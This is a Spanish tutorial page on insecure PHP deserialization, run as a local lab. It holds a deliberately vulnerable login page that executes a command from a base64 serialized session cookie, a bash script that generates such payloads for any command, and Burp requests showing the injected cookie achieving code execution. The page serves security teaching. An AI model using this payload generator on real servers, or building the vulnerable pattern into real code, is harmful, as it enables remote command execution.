---
icon: php
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Deserialización Insegura PHP

## Pagina Vulnerable Deserialización Insegura en PHP

Si nosotros por ejemplo tenemos este codigo de `PHP` como una pagina por ejemplo:

> index.php

```php
<?php
// Clase vulnerable: al deserializar el objeto se ejecuta el comando almacenado en $cmd
class Vulnerable {
    public $cmd;

    public function __construct($cmd) {
        $this->cmd = $cmd;
    }

    public function __destruct() {
        system($this->cmd);
    }
}

// Función para verificar si las credenciales son correctas
function authenticate($username, $password) {
    $valid_users = [
        'admin' => 'admin',
        'user' => 'user'
    ];

    if (isset($valid_users[$username]) && $valid_users[$username] === $password) {
        return true;
    }
    return false;
}

// Si el formulario es enviado
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Recuperamos las credenciales del formulario
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // Si las credenciales son correctas
    if (authenticate($username, $password)) {
        // Creamos un payload malicioso (cookie) solo para usuarios válidos
        $cmd = "echo 'Comando ejecutado exitosamente';";  // Cambia esto con el comando que desees
        $vulnerable_object = new Vulnerable($cmd);
        $serialized_object = serialize($vulnerable_object);
        $encoded_payload = base64_encode($serialized_object);

        // Establecemos la cookie con el payload
        setcookie('session', $encoded_payload, time() + 3600, "/"); // La cookie durará 1 hora

        // Redirigimos al usuario a panel.php después del login
        header('Location: panel.php?username=' . urlencode($username));
        exit;
    } else {
        echo "<p>Credenciales incorrectas. Por favor, inténtalo de nuevo.</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Deserialización Insegura</title>
</head>
<body>
    <h1>Login de Usuario</h1>

    <!-- Formulario de login -->
    <form method="POST">
        <label for="username">Nombre de usuario:</label>
        <input type="text" id="username" name="username" required><br><br>

        <label for="password">Contraseña:</label>
        <input type="password" id="password" name="password" required><br><br>

        <button type="submit">Iniciar sesión</button>
    </form>
</body>
</html>
```

Vemos que no valida la entrada que se `serializa` y la `deserializa` lo que venga de forma insegura, ya que no tiene ninguna medida de seguridad como por ejemplo una implementacion de `JWT`, si entramos a esta pagina veremos lo siguiente:

<figure><img src="../../../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

El usuario por defecto sera el siguiente:

```
user:user
```

Ingresamos las credenciales y abriremos `BurpSuite` para recargar la pagina con la sesion iniciada del usuario `user` y veremos lo siguiente en la peticion con `BurpSuite`:

<figure><img src="../../../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

> Peticion de BurpSuite

```
GET /panel.php?username=user HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://172.17.0.2/
Connection: keep-alive
Cookie: PHPSESSID=r5gbqlkt226hdgitiv4q5jekou; session=TzoxMDoiVnVsbmVyYWJsZSI6MTp7czozOiJjbWQiO3M6Mzg6ImVjaG8gJ0NvbWFuZG8gZWplY3V0YWRvIGV4aXRvc2FtZW50ZSc7Ijt9
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

Vemos que la `serializacion` esta en `session=` por lo que tendremos que reemplazar su contenido, por otro codigo `serializado` con el comando que queramos ejecutar.

## Generar Payload Serializado en Base64

Nos crearemos un script en `bash` para generar codigos `serializados`:

> exploitSerial.sh

```bash
#!/bin/bash

# Verificamos si el usuario pasó el comando
if [ -z "$1" ]; then
    echo "Uso: $0 '<comando_a_ejecutar>'"
    exit 1
fi

# El comando que queremos ejecutar, recibido como argumento
COMMAND=$1

# Creamos un archivo PHP temporal con el código que genera el payload
cat > /tmp/serializable_payload.php <<EOF
<?php
// Clase vulnerable: al deserializar el objeto se ejecuta el comando almacenado en \$cmd
class Vulnerable {
    public \$cmd;

    public function __construct(\$cmd) {
        \$this->cmd = \$cmd;
    }

    public function __destruct() {
        system(\$this->cmd);
    }
}

// Creamos el objeto vulnerable con el comando proporcionado
\$vulnerable_object = new Vulnerable("$COMMAND");

// Serializamos el objeto
\$serialized_object = serialize(\$vulnerable_object);

// Mostramos el objeto serializado en Base64
echo base64_encode(\$serialized_object);
EOF

# Ejecutamos el archivo PHP y obtenemos el payload en base64
payload=$(php /tmp/serializable_payload.php)

# Limpiamos el archivo temporal
rm /tmp/serializable_payload.php

# Mostramos el payload
echo "Payload Base64: $payload"
```

Ahora lo ejecutaremos de la siguiente forma:

```shell
bash exploitSerial.sh 'touch /tmp/exploit.txt'
```

Info:

```
Payload Base64: TzoxMDoiVnVsbmVyYWJsZSI6MTp7czozOiJjbWQiO3M6MjI6InRvdWNoIC90bXAvZXhwbG9pdC50eHQiO30=
```

## Enviar Payload al servidor

Ahora este resultado tendremos que pegarlo en la peticion donde `session=` quedando de la siguiente forma:

```
GET /panel.php?username=user HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://172.17.0.2/
Connection: keep-alive
Cookie: PHPSESSID=r5gbqlkt226hdgitiv4q5jekou; session=TzoxMDoiVnVsbmVyYWJsZSI6MTp7czozOiJjbWQiO3M6MjI6InRvdWNoIC90bXAvZXhwbG9pdC50eHQiO30=
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

Ahora si enviamos la `peticion` veremos lo siguiente en la pagina:

<figure><img src="../../../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>

Vemos que algo ha sido modificado, por lo que podemos deducir que si ha funcionado correctamente.

Vamos a irnos al servidor para comprobar que ha funcionado la `deserializacion` y que se ha ejecutado de forma correcta en el servidor:

<figure><img src="../../../.gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado, por lo que podremos generar `payloads` y ejecutar codigo de forma remota.
